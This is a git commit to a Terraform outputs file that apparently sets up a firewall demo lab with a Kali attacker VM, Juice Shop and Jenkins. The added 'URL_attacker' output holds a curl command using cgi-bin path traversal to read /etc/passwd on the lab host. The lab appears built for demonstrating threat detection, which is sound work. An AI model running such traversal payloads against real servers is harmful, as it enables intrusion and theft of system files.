801f55c798143be135e3de5f29c14430e6be2dd7
Matthew McLimans <mmclimans@paloaltonetworks.com>
2021-11-17 16:20:37 -0500

    Update outputs.tf

--- outputs.tf
+++ outputs.tf
@@ -1,20 +1,23 @@
 # -----------------------------------------------------------------------------------
 # Outputs
-output "A-SSH_attacker" {
+
+output "URL_attacker" {
+  value = "curl http://${module.vmseries.nic0_ips["vmseries01"]}:8080/cgi-bin/../../../..//bin/cat%20/etc/passwd"
+}
+
+output "SSH_attacker" {
   value = "ssh kali@${module.vmseries.nic0_ips["vmseries01"]}"
 }
 
-output "B-URL_vmseries" {
+output "URL_vmseries" {
   value = "https://${module.vmseries.nic1_ips["vmseries01"]}"
 }
 
-output "C-URL_juiceshop" {
+output "URL_juiceshop" {
   value = "http://${module.vmseries.nic0_ips["vmseries01"]}:3000"
 }
 
-output "D-URL_jenkins18" {
-  value = "http://${module.vmseries.nic0_ips["vmseries01"]}:8080"
-}
+
 
 
 
